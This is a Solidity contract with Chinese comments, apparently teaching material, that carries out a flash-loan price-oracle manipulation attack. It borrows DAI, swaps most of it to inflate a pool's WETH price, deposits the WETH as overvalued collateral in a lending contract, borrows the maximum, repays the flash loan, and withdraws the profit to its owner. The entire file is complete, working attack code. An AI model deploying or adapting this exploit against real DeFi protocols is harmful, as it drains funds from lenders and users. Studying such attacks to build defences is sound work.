// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./interfaces/IERC20.sol";
import "./interfaces/IPair.sol";
import "./interfaces/ILending.sol";
import "./interfaces/IUniswapV2Callee.sol";

/// @title 闪电贷攻击合约
/// @notice 演示如何利用价格预言机漏洞获利
contract Attacker is IUniswapV2Callee {
    IPair public loanPool;
    IPair public pricePool;
    ILending public lending;
    IERC20 public weth;
    IERC20 public dai;
    
    address public owner;
    uint256 public profit;
    
    event AttackStarted(uint256 flashAmount, uint256 priceBefore);
    event PriceManipulated(uint256 daiUsed, uint256 wethReceived, uint256 priceAfter);
    event LendingExploited(uint256 collateralDeposited, uint256 daiBorrowed);
    event FlashLoanRepaid(uint256 repayAmount, uint256 profit);
    event AttackExecuted(
        uint256 flashAmount,
        uint256 wethReceived,
        uint256 priceBefore,
        uint256 priceAfter,
        uint256 borrowedFromLending,
        uint256 profit
    );
    
    constructor(address _loanPool, address _pricePool, address _lending, address _weth, address _dai) {
        loanPool = IPair(_loanPool);
        pricePool = IPair(_pricePool);
        lending = ILending(_lending);
        weth = IERC20(_weth);
        dai = IERC20(_dai);
        owner = msg.sender;
    }
    
    /// @notice 发起闪电贷攻击
    /// @param flashAmount 从 loanPool 借入的 DAI 数量
    function attack(uint256 flashAmount) external {
        require(msg.sender == owner, "Only owner");
        loanPool.swap(0, flashAmount, address(this), "attack");
    }
    
    /// @notice 闪电贷回调 - 攻击核心逻辑
    /// @dev 执行顺序：操纵价格 → 超额借款 → 归还闪电贷
    function uniswapV2Call(address, uint256, uint256 amount, bytes calldata) external {
        require(msg.sender == address(loanPool), "Only loanPool");
        
        uint256 priceBefore = pricePool.getPrice();
        emit AttackStarted(amount, priceBefore);
        
        // Step 1: 操纵价格
        uint256 daiForSwap = amount * 90 / 100;
        dai.approve(address(pricePool), daiForSwap);
        uint256 wethReceived = pricePool.swapExact(daiForSwap, true);
        uint256 priceAfter = pricePool.getPrice();
        emit PriceManipulated(daiForSwap, wethReceived, priceAfter);
        
        // Step 2: 利用虚高价格借款
        weth.approve(address(lending), wethReceived);
        lending.deposit(wethReceived);
        uint256 borrowAmount = lending.maxBorrow(address(this));
        lending.borrow(borrowAmount);
        emit LendingExploited(wethReceived, borrowAmount);
        
        // Step 3: 还款
        uint256 repayAmount = amount * 1000 / 997 + 1;
        dai.transfer(address(loanPool), repayAmount);
        profit = dai.balanceOf(address(this));
        emit FlashLoanRepaid(repayAmount, profit);
        
        emit AttackExecuted(amount, wethReceived, priceBefore, priceAfter, borrowAmount, profit);
    }
    
    /// @notice 提取利润
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        dai.transfer(owner, dai.balanceOf(address(this)));
    }
}